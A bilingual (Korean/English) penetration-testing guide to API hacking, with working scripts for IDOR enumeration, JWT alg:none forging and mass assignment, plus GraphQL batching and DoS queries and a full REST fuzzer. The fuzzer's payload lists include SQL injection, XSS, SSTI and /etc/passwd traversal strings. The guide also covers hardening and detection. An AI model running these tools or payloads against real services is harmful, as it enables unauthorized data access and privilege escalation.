> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# API 해킹 완전 가이드

## 0. 초보자를 위한 개념 이해

### API 해킹이란?

API 해킹은 REST API, GraphQL, gRPC 등 서비스 간 인터페이스에서 인증 우회, 권한 오용, 데이터 노출, 인젝션 등의 취약점을 찾는 기법입니다. 모든 현대 웹/모바일 앱이 API 기반으로 작동하므로, API 보안은 버그바운티와 레드팀 작전에서 가장 중요한 공격 표면이 되었습니다. OWASP API Security Top 10은 API 해킹의 표준 참조 가이드입니다.

**왜 배우는가:**
```
API 취약점이 중요한 이유:

  전통 웹 취약점          API 취약점
  ──────────────────────────────────────────────
  HTML 폼 조작             JSON 파라미터 조작
  쿠키 세션 탈취           JWT/API 키 탈취
  직접 URL 접근            BOLA — 객체 ID 조작
  CSRF                     Mass Assignment

  실제 사례:
    Peloton API  → 인증 없이 모든 사용자 데이터 접근
    T-Mobile     → API BOLA로 3700만 계정 정보 유출
    Instagram    → 전화번호 열거 API 무제한 호출
```

### 핵심 개념 정리

```
OWASP API Top 10 핵심:

  API1 BOLA (IDOR)
    GET /api/users/123 → GET /api/users/124
    내 데이터 외 타인 데이터 접근

  API2 인증 취약점
    JWT alg:none, 만료 토큰 허용, OTP 브루트포스

  API3 과도한 데이터 노출
    응답에 password_hash, ssn 등 불필요 필드 포함

  API6 Mass Assignment
    {"role":"admin"} 전송 시 권한 상승
    {"balance":999999} 전송 시 잔액 변경

  GraphQL 특수 취약점:
    Introspection → 전체 스키마 노출
    Batch 쿼리    → 브루트포스 우회 (1회 요청 = 다수 쿼리)
    IDOR          → 중첩 쿼리로 타인 데이터 접근
```

### 필요한 도구 및 환경
- **Burp Suite**: HTTP API 인터셉트 및 수정
- **Postman**: API 테스트 및 컬렉션 관리
- **ffuf**: API 엔드포인트 퍼징
- **jwt_tool**: JWT 분석 및 공격 Python 도구

### 기초 실습 예제
```python
#!/usr/bin/env python3
"""API BOLA/IDOR 취약점 자동 탐지 — 연속 ID 열거."""

import asyncio
from dataclasses import dataclass

import httpx


@dataclass
class ApiEndpointResult:
    url: str
    status_code: int
    response_size: int
    is_vulnerable: bool
    note: str


async def test_idor(
    base_url: str,
    endpoint_template: str,   # 예: "/api/users/{id}"
    my_id: int,
    test_ids: list[int],
    headers: dict[str, str],
) -> list[ApiEndpointResult]:
    """BOLA/IDOR 취약점 테스트: 다른 사용자 ID로 접근 시도."""
    results: list[ApiEndpointResult] = []

    # 내 데이터 크기 먼저 확인 (기준)
    async with httpx.AsyncClient(verify=False) as client:
        my_url = base_url + endpoint_template.format(id=my_id)
        my_resp = await client.get(my_url, headers=headers)
        my_size = len(my_resp.content)

        for test_id in test_ids:
            if test_id == my_id:
                continue
            url = base_url + endpoint_template.format(id=test_id)
            try:
                resp = await client.get(url, headers=headers, timeout=5.0)
                # 200 응답 + 내 데이터 크기와 유사 → 접근 성공 의심
                is_vuln = (
                    resp.status_code == 200
                    and len(resp.content) > 50
                )
                results.append(ApiEndpointResult(
                    url=url,
                    status_code=resp.status_code,
                    response_size=len(resp.content),
                    is_vulnerable=is_vuln,
                    note="타인 데이터 접근 가능!" if is_vuln else "",
                ))
            except (httpx.TimeoutException, httpx.ConnectError):
                pass
    return results


if __name__ == "__main__":
    print("API BOLA 테스트 예제 (실제 실행: 허가된 대상에서만)")
    print("endpoint: /api/v1/users/{id}")
    print("테스트 방법: 자신의 ID 외 다른 ID 접근 시도 → 200 응답이면 취약")
```

---

## API 보안 위협 지형도

```
OWASP API Security Top 10 (2019) — 최초 API 전용 Top 10

API1  Broken Object Level Authorization (BOLA/IDOR)
        → 가장 많이 발생하는 API 취약점. 객체 ID 조작으로 타 사용자 데이터 접근
        → Exploitability: 3, Prevalence: 3, Detectability: 2
API2  Broken Authentication
        → 자격증명 스터핑, 브루트포스, 약한 JWT, 취약한 비밀번호 재설정
        → 인증 엔드포인트는 일반 엔드포인트보다 추가 보호 레이어 필요
API3  Excessive Data Exposure
        → 클라이언트가 필터링할 것을 믿고 모든 객체 속성을 노출
        → 응답에 불필요한 민감 필드 포함
API4  Lack of Resources & Rate Limiting
        → 요청 크기/수 제한 없음 → DoS, 브루트포스 공격 가능
        → SMS 인증코드 6자리를 제한 없이 시도 가능한 시나리오
API5  Broken Function Level Authorization
        → 관리자 기능을 일반 사용자가 접근 가능
        → 복잡한 역할/그룹/계층 구조로 인한 권한 혼동
API6  Mass Assignment
        → 클라이언트 제공 데이터를 화이트리스트 없이 데이터 모델에 바인딩
        → role, is_admin, balance 등 민감 필드 임의 변경
API7  Security Misconfiguration
        → 불안전한 기본 설정, 불완전한 설정, 과도한 CORS, 상세 오류 메시지
API8  Injection
        → SQL, NoSQL, Command Injection — API 파라미터를 통한 인젝션
API9  Improper Assets Management
        → 구버전 API, 비공개 엔드포인트, 디버그 엔드포인트 노출
        → API 인벤토리 미관리 → 레거시 버전 공격 가능
API10 Insufficient Logging & Monitoring
        → 침해 탐지 평균 200일 소요
        → API 요청 로깅 부재 → 공격 추적/대응 불가
```

### API2 — Broken Authentication 상세 공격 시나리오
```
시나리오 1: 자격증명 스터핑 (Credential Stuffing)
  - 유출된 username/password 목록으로 API 로그인 대량 시도
  - Rate Limiting, CAPTCHA, 계정 잠금 미설정 시 성공

시나리오 2: SMS OTP 브루트포스
  POST /api/system/verification-codes (SMS 발송 요청)
  → 6자리 코드 = 1,000,000 가지 경우
  → Rate Limiting 없으면 멀티스레드로 수 분 내 전수 탐색

시나리오 3: 약한 JWT 토큰
  - alg: none → 서명 없는 토큰 허용
  - 약한 HS256 비밀키 → hashcat으로 오프라인 크랙
  - 만료일(exp) 미검증 → 영구 토큰

대응책:
  - 인증 엔드포인트 Rate Limiting (5회/분)
  - CAPTCHA / account lockout
  - MFA (Multi-Factor Authentication) 적용
  - JWT: 강한 비밀키(256bit), 짧은 만료, 알고리즘 고정
  - OAuth 2.0 + PKCE 표준 준수
```

### API9 — Improper Assets Management 탐지

이전 버전이나 미문서화된 API 엔드포인트를 탐지합니다. /v1/, /api/old/, /debug/ 등 구버전 경로에 접근하여 보안 업데이트가 누락된 엔드포인트를 찾습니다.

```bash
# 구버전 API 엔드포인트 탐지
# /v1/, /v2/, /api/v1/, /api/v2/ 등 버전별 접근 시도
ffuf -u https://api.target.com/FUZZ/users \
     -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Swagger/OpenAPI 문서 발견
curl https://api.target.com/swagger.json
curl https://api.target.com/openapi.yaml
curl https://api.target.com/docs
curl https://api.target.com/v1/swagger-ui

# 디버그/내부 엔드포인트 탐지
nuclei -u https://api.target.com -tags debug,exposure,api

# 과거 API 엔드포인트 (Wayback Machine)
echo "api.target.com" | waybackurls | grep "/api/" | sort -u
```

---

## 1. API 정찰

### API 엔드포인트 발견

JavaScript 파일을 분석하여 숨겨진 API 엔드포인트를 추출합니다. 프론트엔드 코드에 하드코딩된 API 경로와 파라미터를 파악합니다.

```bash
# JS 파일에서 API 엔드포인트 추출
# 브라우저에서 JS 파일 URL 수집 후:
cat js_files.txt | while read url; do
    curl -s "$url" | grep -oE "(https?://[^\"']+|/api/[^\"' ]+)" | sort -u
done >> api_endpoints.txt

# LinkFinder로 JS 분석
python3 linkfinder.py -i https://target.com -d -o endpoints.html

# JSFinder
python3 JSFinder.py -u https://target.com -d

# Wayback Machine에서 과거 API 엔드포인트
echo "target.com" | waybackurls | grep "/api/" | sort -u

# gau로 API 경로 수집
gau target.com | grep -i "api\|v1\|v2\|v3\|graphql\|rest\|swagger"

# Swagger/OpenAPI 발견
ffuf -u https://target.com/FUZZ -w api_paths.txt -fc 404
# 일반적인 경로:
# /swagger, /swagger-ui, /swagger.json, /api-docs
# /openapi.json, /v1/swagger, /docs, /redoc
```

### API 문서 분석

Swagger/OpenAPI 문서에서 API 엔드포인트 목록을 추출합니다. 노출된 API 스펙으로 파라미터와 인증 방식을 파악하여 테스트 계획을 수립합니다.

```bash
# Swagger UI에서 API 목록 추출
curl -s https://target.com/swagger.json | \
    python3 -c "
import json, sys
spec = json.load(sys.stdin)
for path, methods in spec.get('paths', {}).items():
    for method in methods:
        print(f'{method.upper()} {path}')
"

# Postman 컬렉션 생성
curl -s https://target.com/swagger.json > swagger.json
swagger-codegen generate -i swagger.json -l html2 -o docs/

# OpenAPI 3.0 파싱
python3 -c "
import yaml, sys
with open('openapi.yaml') as f:
    spec = yaml.safe_load(f)
for path in spec.get('paths', {}).keys():
    print(path)
"
```

---

## 2. BOLA/IDOR (API1)

### BOLA 탐지 및 익스플로잇

BOLA(Broken Object Level Authorization) 취약점을 테스트합니다. 객체 ID를 변경하여 다른 사용자의 데이터에 접근할 수 있는지 확인합니다.

```bash
# 기본 IDOR 테스트
# 계정 A의 토큰으로 계정 B의 리소스 접근

# 계정 A로 로그인
TOKEN_A="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# 계정 B의 user_id 발견
USER_B_ID="12345"

# A의 토큰으로 B의 데이터 요청
curl -H "Authorization: Bearer $TOKEN_A" \
     https://api.target.com/v1/users/$USER_B_ID/profile

# 숫자 ID 시퀀스 브루트포스
for id in $(seq 1 1000); do
    response=$(curl -s -w "%{http_code}" \
                    -H "Authorization: Bearer $TOKEN_A" \
                    https://api.target.com/v1/orders/$id)
    
    if echo "$response" | grep -q "200"; then
        echo "[+] 접근 가능: order_id=$id"
        echo "$response" | python3 -m json.tool
    fi
done

# UUID/GUID IDOR
# 랜덤해 보이지만 예측 가능한 경우
# V1 UUID: 타임스탬프 기반 → 시간대 근처 UUID 탐색
python3 uuid_brute.py --start-time "2024-01-01" --end-time "2024-01-02"
```

### 간접 객체 참조 변환

객체 참조를 변환하는 Python 코드입니다. UUID나 HMAC 기반 참조로 직접 ID 열거를 방지하지만 알고리즘이 취약하면 우회 가능합니다.

```python
#!/usr/bin/env python3
"""API IDOR 자동 탐지"""

import requests
import json
from concurrent.futures import ThreadPoolExecutor

class IDORScanner:
    def __init__(self, base_url: str, token_a: str, token_b: str):
        self.base_url = base_url
        self.headers_a = {"Authorization": f"Bearer {token_a}"}
        self.headers_b = {"Authorization": f"Bearer {token_b}"}
    
    def get_user_b_resources(self) -> list:
        """계정 B로 리소스 목록 획득"""
        resources = []
        
        # 계정 B의 주문 목록
        resp = requests.get(
            f"{self.base_url}/v1/orders",
            headers=self.headers_b
        )
        if resp.status_code == 200:
            for order in resp.json():
                resources.append(('orders', order.get('id')))
        
        return resources
    
    def test_idor(self, resource_type: str, resource_id: str) -> bool:
        """계정 A로 계정 B의 리소스 접근 시도"""
        resp = requests.get(
            f"{self.base_url}/v1/{resource_type}/{resource_id}",
            headers=self.headers_a
        )
        
        if resp.status_code == 200:
            data = resp.json()
            print(f"[!] IDOR 발견: GET /{resource_type}/{resource_id}")
            print(f"    데이터: {json.dumps(data, indent=2)[:200]}")
            return True
        
        return False
    
    def scan(self):
        resources = self.get_user_b_resources()
        print(f"[*] 테스트 대상 {len(resources)}개 리소스")
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [
                executor.submit(self.test_idor, rtype, rid)
                for rtype, rid in resources
            ]
```

---

## 3. Broken Authentication (API2)

### JWT 공격


JWT(JSON Web Token) 취약점 테스트입니다. 알고리즘을 None으로 설정하거나 HS256에서 RS256으로 변환하는 공격, 약한 시크릿 브루트포스 등 다양한 JWT 우회 기법을 확인합니다.

```python
import requests
import json
import base64

def test_jwt_attacks(api_url: str, valid_token: str):
    """JWT 다양한 공격 자동 테스트"""
    
    attacks = {}
    
    # 1. alg:none 공격
    parts = valid_token.split('.')
    header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
    payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))
    
    # 페이로드 수정
    payload['role'] = 'admin'
    payload['admin'] = True
    
    header['alg'] = 'none'
    
    new_header = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
    new_payload = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
    none_token = f"{new_header.decode()}.{new_payload.decode()}."
    attacks['alg_none'] = none_token
    
    # 2. 빈 서명
    attacks['empty_sig'] = f"{parts[0]}.{parts[1]}."
    
    for attack_name, token in attacks.items():
        resp = requests.get(
            f"{api_url}/admin",
            headers={"Authorization": f"Bearer {token}"}
        )
        if resp.status_code != 401:
            print(f"[!] {attack_name} 공격 성공! Status: {resp.status_code}")
```

### API Key 브루트포스

API 키의 엔트로피를 분석하고 예측 가능한 패턴을 찾습니다. 짧거나 낮은 엔트로피의 API 키는 브루트포스에 취약합니다.

```python
def test_api_key_entropy(api_url: str, sample_keys: list):
    """API 키 엔트로피 분석 및 패턴 발견"""
    import math
    import re
    
    for key in sample_keys:
        # 엔트로피 계산
        char_freq = {}
        for c in key:
            char_freq[c] = char_freq.get(c, 0) + 1
        
        entropy = -sum((f/len(key)) * math.log2(f/len(key)) 
                      for f in char_freq.values())
        
        print(f"키: {key[:10]}... 엔트로피: {entropy:.2f}")
        
        if entropy < 3.0:
            print(f"[!] 낮은 엔트로피 - 패턴 존재 가능")
        
        # 타임스탬프 패턴 확인
        if re.match(r'^[0-9a-f]{8}-', key):
            print(f"[!] UUID v1 패턴 - 타임스탬프 예측 가능")
```

---

## 4. Mass Assignment / Object Property (API3)

Mass Assignment 취약점은 사용자가 전송한 모든 필드를 서버가 자동으로 바인딩할 때 발생합니다. admin, role 같은 민감한 필드를 포함시켜 권한을 상승시킵니다.

```python
# 취약한 API: 모든 필드 자동 바인딩
# PUT /api/users/me
{
    "name": "John",
    "email": "john@example.com",
    "role": "admin",       # ← 공격자 추가
    "is_admin": true,      # ← 공격자 추가
    "balance": 99999       # ← 공격자 추가
}

# 테스트: 추가 필드 전송
def test_mass_assignment(api_url: str, token: str):
    
    # 공격 페이로드 목록
    payloads = [
        {"role": "admin"},
        {"is_admin": True, "admin": 1},
        {"privilege": "admin"},
        {"user_type": "administrator"},
        {"permissions": ["read", "write", "admin"]},
        {"balance": 99999999},
        {"credit": 1000000},
        {"verified": True},
        {"email_verified": True},
        {"account_type": "premium"},
    ]
    
    # 현재 상태 확인
    before = requests.get(
        f"{api_url}/me",
        headers={"Authorization": f"Bearer {token}"}
    ).json()
    
    for payload in payloads:
        resp = requests.put(
            f"{api_url}/me",
            json=payload,
            headers={"Authorization": f"Bearer {token}",
                     "Content-Type": "application/json"}
        )
        
        after = requests.get(
            f"{api_url}/me",
            headers={"Authorization": f"Bearer {token}"}
        ).json()
        
        # 변경된 필드 확인
        for key, value in payload.items():
            if after.get(key) == value and before.get(key) != value:
                print(f"[!] Mass Assignment 취약점! 필드 변경: {key}={value}")
```

---

## 5. GraphQL 보안 테스트

GraphQL 인트로스펙션으로 API 스키마 전체를 추출합니다. 모든 쿼리, 뮤테이션, 타입 정보를 파악하여 인가 결함과 인젝션 취약점을 탐지합니다.

```bash
# GraphQL 인트로스펙션 (스키마 추출)
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '{"query":"{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"}'

# GraphQL 침투 테스트 도구
pip install graphw00f gql

# graphw00f - GraphQL 엔진 지문 수집
python3 main.py -d https://target.com/graphql

# InQL - Burp Suite 플러그인
# 자동 스키마 분석 및 쿼리 생성

# 배치 공격 (Rate Limit 우회)
curl -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d '[
        {"query":"{user(id:1){email}}"},
        {"query":"{user(id:2){email}}"},
        {"query":"{user(id:3){email}}"},
        ...100개...
    ]'

# GraphQL 인젝션
{
  "query": "{ user(id: \"1\") { email } }"
}
# id 필드에 인젝션:
{
  "query": "{ user(id: \"1 OR 1=1\") { email } }"
}

# 깊은 재귀 쿼리 (DoS)
{
  user {
    friends {
      friends {
        friends {  # 깊이 제한 없으면 서버 과부하
          name
        }
      }
    }
  }
}
```

---

## 6. REST API 퍼징


REST API 해킹의 핵심은 인증 토큰 노출, IDOR(Insecure Direct Object Reference), 과도한 데이터 반환, 속도 제한 미적용 등의 취약점을 찾는 것입니다. Burp Suite와 Postman으로 API 엔드포인트를 체계적으로 테스트합니다.

```python
#!/usr/bin/env python3
"""
REST API 자동 퍼저 — OpenAPI 스펙 기반 + 수동 퍼징 지원
사용: python3 api_fuzzer.py fuzz --url https://api.target.com \
                                  --token eyJ... \
                                  --endpoints /api/v1/users /api/v1/orders
      python3 api_fuzzer.py openapi --spec swagger.json \
                                     --url https://api.target.com \
                                     --token eyJ...
      python3 api_fuzzer.py idor   --url https://api.target.com/v1/orders \
                                    --token-a TOKEN_A --token-b TOKEN_B \
                                    --id-range 1 500
"""

from __future__ import annotations
import argparse
import json
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any
from urllib.parse import urljoin

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    sys.exit("pip install requests")


# ── 퍼징 페이로드 정의 ───────────────────────────────────────

PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR '1'='1", "' OR 1=1--", "1; DROP TABLE users--",
        "' UNION SELECT 1,2,3--", "1 AND SLEEP(5)--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "';alert(1)//",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}", "*{7*7}",
    ],
    "path_traversal": [
        "../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ],
    "special": [
        "", " ", "null", "undefined", "true", "false",
        "0", "-1", "9999999999", "A" * 8192, "\x00", "\n\r",
        "admin", "'; --", "<>\"'{}|\\^`",
    ],
}

SQL_ERROR_PATTERNS = [
    "syntax error", "mysql_fetch", "ORA-", "sqlite",
    "pg_query", "unclosed quotation", "sqlstate", "JDBC",
    "java.sql.", "System.Data.SqlClient",
]


# ── 발견 결과 ────────────────────────────────────────────────

@dataclass
class Finding:
    vuln_type: str
    url: str
    method: str
    param: str
    payload: str
    status: int
    evidence: str = ""
    elapsed: float = 0.0

    def __str__(self) -> str:
        return (
            f"[{self.vuln_type}] {self.method} {self.url}\n"
            f"  param={self.param!r}  payload={self.payload[:60]!r}\n"
            f"  status={self.status}  elapsed={self.elapsed:.2f}s"
            + (f"\n  evidence={self.evidence[:120]!r}" if self.evidence else "")
        )


# ── HTTP 세션 헬퍼 ───────────────────────────────────────────

def make_session(token: str | None = None,
                 timeout: int = 10) -> requests.Session:
    sess = requests.Session()
    retry = Retry(total=2, backoff_factor=0.3,
                  status_forcelist=[429, 502, 503, 504])
    sess.mount("https://", HTTPAdapter(max_retries=retry))
    sess.mount("http://",  HTTPAdapter(max_retries=retry))
    if token:
        sess.headers["Authorization"] = f"Bearer {token}"
    sess.headers["User-Agent"] = "APIFuzzer/1.0"
    return sess


# ── 응답 분석 ────────────────────────────────────────────────

def analyze(resp: requests.Response, url: str, method: str,
            param: str, payload: str) -> list[Finding]:
    findings: list[Finding] = []
    body = resp.text
    elapsed = resp.elapsed.total_seconds()

    # SQL 에러
    for pat in SQL_ERROR_PATTERNS:
        if pat.lower() in body.lower():
            findings.append(Finding(
                "SQL Injection", url, method, param, payload,
                resp.status_code, pat, elapsed,
            ))
            break

    # Reflected XSS
    if payload in body and any(
        tag in payload.lower() for tag in ("<script", "<img", "onerror=")
    ):
        findings.append(Finding(
            "Reflected XSS", url, method, param, payload,
            resp.status_code, "", elapsed,
        ))

    # SSTI
    if "{{7*7}}" in payload and "49" in body:
        findings.append(Finding(
            "SSTI", url, method, param, payload,
            resp.status_code, "7*7=49 반영", elapsed,
        ))

    # Path Traversal
    if "root:" in body or "[extensions]" in body:
        findings.append(Finding(
            "Path Traversal", url, method, param, payload,
            resp.status_code, body[:100], elapsed,
        ))

    # 500 오류 노출
    if resp.status_code == 500:
        findings.append(Finding(
            "Internal Error", url, method, param, payload,
            500, body[:200], elapsed,
        ))

    # Time-based (5초 이상)
    if elapsed > 5.0:
        findings.append(Finding(
            "Time-based Blind", url, method, param, payload,
            resp.status_code, f"elapsed={elapsed:.1f}s", elapsed,
        ))

    return findings


# ── 퍼저 코어 ────────────────────────────────────────────────

class APIFuzzer:
    def __init__(self, base_url: str, token: str | None = None,
                 threads: int = 5, timeout: int = 10,
                 payload_types: list[str] | None = None) -> None:
        self.base_url  = base_url.rstrip("/")
        self.session   = make_session(token, timeout)
        self.timeout   = timeout
        self.threads   = threads
        self.findings: list[Finding] = []
        ptypes = payload_types or list(PAYLOADS)
        self.payloads  = [p for t in ptypes for p in PAYLOADS.get(t, [])]

    def _fuzz_single(self, url: str, method: str,
                     param: str, payload: str) -> list[Finding]:
        try:
            if method == "GET":
                r = self.session.get(url, params={param: payload},
                                     timeout=self.timeout)
            else:
                r = self.session.request(method, url,
                                         json={param: payload},
                                         timeout=self.timeout)
            return analyze(r, url, method, param, payload)
        except requests.RequestException:
            return []

    def fuzz_endpoint(self, path: str, method: str = "GET",
                      params: list[str] | None = None) -> None:
        url = f"{self.base_url}{path}"
        test_params = params or ["id", "user_id", "name", "search", "q",
                                  "page", "sort", "filter", "file", "path"]
        tasks: list[tuple] = [
            (url, method, param, payload)
            for param in test_params
            for payload in self.payloads
        ]
        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            futs = {pool.submit(self._fuzz_single, *t): t for t in tasks}
            for fut in as_completed(futs):
                for f in fut.result():
                    self.findings.append(f)
                    print(f)

    def fuzz_openapi(self, spec_path: Path) -> None:
        """OpenAPI/Swagger 스펙 파싱 후 모든 엔드포인트 퍼징"""
        spec = json.loads(spec_path.read_text())
        paths = spec.get("paths", {})
        print(f"[*] OpenAPI 엔드포인트 {len(paths)}개 발견")
        for path, methods in paths.items():
            for method_name, op in methods.items():
                if method_name in ("get", "post", "put", "patch", "delete"):
                    # 파라미터 이름 추출
                    params = [
                        p.get("name", "q")
                        for p in op.get("parameters", [])
                        if p.get("in") in ("query", "path")
                    ]
                    self.fuzz_endpoint(path, method_name.upper(), params or None)

    def idor_scan(self, path_template: str, id_start: int, id_end: int,
                  own_ids: set[int], token_victim: str) -> None:
        """IDOR 스캔: 공격자 토큰으로 피해자 리소스 ID 접근 시도"""
        victim_sess = make_session(token_victim, self.timeout)

        def check(resource_id: int) -> Finding | None:
            if resource_id in own_ids:
                return None
            url = f"{self.base_url}{path_template.format(id=resource_id)}"
            try:
                r = self.session.get(url, timeout=self.timeout)
                if r.status_code == 200:
                    return Finding(
                        "IDOR/BOLA", url, "GET", "id",
                        str(resource_id), 200,
                        r.text[:100], r.elapsed.total_seconds(),
                    )
            except requests.RequestException:
                pass
            return None

        with ThreadPoolExecutor(max_workers=self.threads) as pool:
            for f in as_completed(
                pool.submit(check, i) for i in range(id_start, id_end + 1)
            ):
                result = f.result()
                if result:
                    self.findings.append(result)
                    print(result)

    def report(self, output: Path | None = None) -> None:
        summary: dict[str, int] = {}
        for f in self.findings:
            summary[f.vuln_type] = summary.get(f.vuln_type, 0) + 1
        print(f"\n{'='*50}")
        print(f"[요약] 총 {len(self.findings)}개 발견")
        for vtype, cnt in sorted(summary.items(), key=lambda x: -x[1]):
            print(f"  {vtype:25s}: {cnt}")

        if output:
            data = [
                {"type": f.vuln_type, "url": f.url, "method": f.method,
                 "param": f.param, "payload": f.payload,
                 "status": f.status, "evidence": f.evidence}
                for f in self.findings
            ]
            output.write_text(json.dumps(data, indent=2, ensure_ascii=False))
            print(f"[*] 결과 저장: {output}")


# ── CLI ──────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(description="REST API 자동 퍼저")
    parser.add_argument("--url",     required=True,  help="기본 URL")
    parser.add_argument("--token",   default=None,   help="Bearer 토큰")
    parser.add_argument("--threads", type=int, default=5)
    parser.add_argument("--timeout", type=int, default=10)
    parser.add_argument("--output",  type=Path)
    parser.add_argument("--payloads", nargs="*",
                        choices=list(PAYLOADS), default=None)

    sub = parser.add_subparsers(dest="cmd", required=True)

    fuzz_p = sub.add_parser("fuzz", help="엔드포인트 퍼징")
    fuzz_p.add_argument("--endpoints", nargs="+", required=True)
    fuzz_p.add_argument("--method", default="GET")
    fuzz_p.add_argument("--params", nargs="*")

    oa_p = sub.add_parser("openapi", help="OpenAPI 스펙 기반 퍼징")
    oa_p.add_argument("--spec", type=Path, required=True)

    idor_p = sub.add_parser("idor", help="IDOR 스캔")
    idor_p.add_argument("--path", required=True,
                        help="리소스 경로 템플릿, 예: /v1/orders/{id}")
    idor_p.add_argument("--id-range", nargs=2, type=int, metavar=("START", "END"),
                        required=True)
    idor_p.add_argument("--token-victim", required=True)
    idor_p.add_argument("--own-ids", nargs="*", type=int, default=[])

    args = parser.parse_args()
    fuzzer = APIFuzzer(args.url, args.token, args.threads,
                       args.timeout, args.payloads)

    if args.cmd == "fuzz":
        for ep in args.endpoints:
            fuzzer.fuzz_endpoint(ep, args.method.upper(), args.params)
    elif args.cmd == "openapi":
        fuzzer.fuzz_openapi(args.spec)
    elif args.cmd == "idor":
        fuzzer.idor_scan(args.path, args.id_range[0], args.id_range[1],
                         set(args.own_ids), args.token_victim)

    fuzzer.report(args.output)


if __name__ == "__main__":
    main()
```

---

## 7. API 보안 강화 가이드

### 인증 및 권한

```python
# 안전한 API 키 생성
import secrets
api_key = secrets.token_urlsafe(32)  # 256비트 엔트로피

# JWT 안전한 설정
import jwt
from datetime import datetime, timedelta, timezone

def create_token(user_id: int, secret: str) -> str:
    payload = {
        'sub': str(user_id),
        'iat': datetime.now(timezone.utc),
        'exp': datetime.now(timezone.utc) + timedelta(hours=1),
        'jti': secrets.token_urlsafe(16),  # JWT ID (재사용 방지)
    }
    
    return jwt.encode(payload, secret, algorithm='HS256')

# Rate Limiting (Flask-Limiter)
from flask_limiter import Limiter

limiter = Limiter(
    app,
    key_func=get_remote_address,
    default_limits=["200 per day", "50 per hour"]
)

@app.route("/api/login")
@limiter.limit("5 per minute")  # 로그인은 더 엄격하게
def login():
    pass
```

### API 보안 체크리스트

```
인증:
  □ 모든 엔드포인트 인증 필요
  □ API 키 고엔트로피 (32바이트 이상)
  □ JWT: HS256 이상, 비밀키 256비트 이상
  □ 짧은 토큰 만료 시간 (1시간 이하)
  □ Refresh Token 로테이션

권한:
  □ 객체 수준 권한 (BOLA 방지)
  □ 기능 수준 권한 (관리자 API 분리)
  □ 속성 수준 권한 (Mass Assignment 방지)

입력 검증:
  □ 모든 파라미터 유형 검증
  □ 화이트리스트 기반 필드 허용
  □ 최대 페이로드 크기 제한
  □ SQL 쿼리 파라미터 바인딩

Rate Limiting:
  □ IP별 요청 제한
  □ 사용자별 요청 제한
  □ 엔드포인트별 맞춤 제한

모니터링:
  □ 모든 API 요청 로깅
  □ 비정상 패턴 알림
  □ API 인벤토리 관리
  □ 지원 종료 버전 제거
```

---

<!-- detect-validate-17 -->
## API 공격 탐지와 방어 검증

API 공격은 *어떻게 인가·로직을 우회하는가*를 다루지만, 방어자는 **각 공격이 게이트웨이·앱 로그 어디에 흔적을 남기는가**와 **인증·레이트리밋·스키마 검증이 실제로 막는가**를 검증해야 한다(섹션 52 와 상호보완).

### 공격 → 계층 → 통제(방어자) → 탐지 신호

| 공격(OWASP API) | 노리는 계층 | 1차 통제(방어자) | 탐지 신호 |
|---|---|---|---|
| BOLA/IDOR(API1) | 객체 인가 | 객체 소유 검증 | 타 사용자 ID 접근, 403 급증 |
| 인증 취약(API2) | 토큰 검증 | 강한 JWT 검증, MFA | alg:none, 만료 무시 토큰 |
| 과다 데이터 노출(API3) | 응답 스키마 | 필드 화이트리스트 | 민감필드 응답, 과대 페이로드 |
| 리소스 남용(API4) | 레이트/쿼터 | 레이트리밋, 페이지네이션 | 대량 요청, 429 패턴 |

### 방어 검증 (직접 확인)

```bash
# 인증·레이트리밋이 실제 적용되는지 검증(소유 API) — 401 과 429 가 나와야 정상
curl -s -o /dev/null -w 'no-auth: %{http_code}\n' https://api.localhost/v1/users   # 401 기대
for i in $(seq 1 120); do curl -s -o /dev/null -w '%{http_code} ' https://api.localhost/v1/ping; done; echo
# 끝부분에 429 가 나타나야 레이트리밋 동작 — 전부 200 이면 미적용
```

> 검증은 **승인된 교전·소유 API·통제 환경**에서만. "인증/레이트리밋 설정"과 "실제 우회를 막고 경보한다"는 다르다 — BOLA/토큰 PoC 를 자신 API 에 재현해 차단·로깅을 확인한다([[52_API_Security]], [[13_SOC_Blue_Team]]).

**최신 기법·통제 (2025–2026):**
- OWASP API Top 10 중심(BOLA·과다노출) — 인가가 서버측에서 강제되는지 재현. 검증: IDOR이 차단되는가([[52_API_Security]])
- 토큰·OAuth 흐름 오구성 — 스코프·검증이 강제되는지 확인

---

<a name="english"></a>

# Complete Guide to API Hacking

## API Security Threat Landscape

```
API Security Attack Vectors:

Authentication & Authorization:
  - Broken Object Level Authorization (BOLA/IDOR)
  - Broken Function Level Authorization
  - Broken Authentication (JWT attacks, weak API keys)

Data Exposure:
  - Mass Assignment
  - Excessive Data Exposure
  - Sensitive data in responses

Business Logic:
  - Rate limit bypass
  - Race conditions
  - Price manipulation

Infrastructure:
  - SSRF via API endpoints
  - XXE in XML APIs
  - Injection (SQL, NoSQL, Command)
```

---

## 1. API Discovery

```bash
# Find API endpoints
# 1. JavaScript file analysis
curl https://target.com | grep -oP 'api[^\s"]*'

# 2. Wayback Machine historical URLs
waybackurls target.com | grep "/api/"

# 3. Swagger/OpenAPI spec discovery
curl https://target.com/swagger.json
curl https://target.com/api/swagger.json
curl https://target.com/openapi.yaml
curl https://api.target.com/v1/docs

# 4. Google dorking
site:target.com inurl:api
site:target.com filetype:json "api"

